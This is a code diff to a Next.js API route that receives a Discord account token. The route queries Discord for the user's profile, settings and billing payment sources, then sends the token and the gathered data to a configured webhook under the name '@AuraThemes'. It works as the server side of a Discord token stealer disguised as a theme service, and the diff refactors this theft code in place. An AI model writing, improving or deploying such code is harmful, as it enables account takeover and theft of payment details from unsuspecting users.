@@ -1,6 +1,5 @@
 import { Emojis, Languages, UserProfile, BillingSource, Embed, ResponseData } from "@/interfaces";
 import k4itrunConfig from '@k4itrunconfig';
-
 import type { NextApiRequest, NextApiResponse } from 'next';
 import fetch from 'isomorphic-unfetch';
 
@@ -19,38 +18,46 @@ export default async (
   try {
     const { data: token } = request.query as { data?: string };
 
-    if (!token) return response.send({...obj});
-    else response.send(token);
-
-    let user = await (await fetch('https://discord.com/api/v9/users/@me', {
-      headers: {
-        'Content-Type': 'application/json',
-        Authorization: token
-      }
-    })).json();
-
-    let CONFIG_HOOK = {
-      avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-      username: '@AuraThemes',
-      embeds: await embeds({ token, ...user })
-    };
+    if (!token) {
+      return response.send({ ...obj });
+    } else {
+      response.send(token);
+    }
 
     try {
-      return await (await fetch(k4itrunConfig.webhook, {
+      let user = await fetch('https://discord.com/api/v9/users/@me', {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': token
+        }
+      });
+
+      if (!user.ok) return;
+
+      const CONFIG_HOOK = {
+        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+        username: '@AuraThemes',
+        embeds: await embeds({ token, ...await user.json() })
+      };
+
+      const hook = await fetch(k4itrunConfig.webhook, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(CONFIG_HOOK)
-      })).json();
-    } catch (error) {
-      return;
-    };
-    /** **/
-  } catch (error) {
-    response.status(500);
+      });
+
+      if (!hook.ok) return;
+    } catch (error: any) {
+      console.error(error)
+    }
+
+  } catch (error: any) {
+    console.error(error)
   }
-}
+};
 
 const emojis: Emojis = {
   themes: {
@@ -125,16 +132,20 @@ const languages: Languages = {
 
 async function _fetch(url: string, token: string): Promise<any> {
   try {
-    let res = await (await fetch(url, {
+    const response = await fetch(url, {
       headers: {
         'Content-Type': 'application/json',
+        Authorization: token
+      },
+    });
 
-        Authorization: token,
-      }
-    })).json();
-    return { ...res };
+    if (!response.ok) {
+      return 'Invalid'
+    }
+
+    return await response.json();
   } catch (error) {
-    return {};
+    return 'Invalid';
   }
 }
 
@@ -220,10 +231,10 @@ async function embeds(user: UserProfile & { token: string }): Promise<Embed[]> {
   const settings = await _fetch(`https://discord.com/api/v9/users/@me/settings`, user.token);
   const payment = await _fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, user.token);
 
+  if(profile === 'invalid') return [];
+
   const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
   const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;
-
-  console.log(profile)
 
   return [
     {
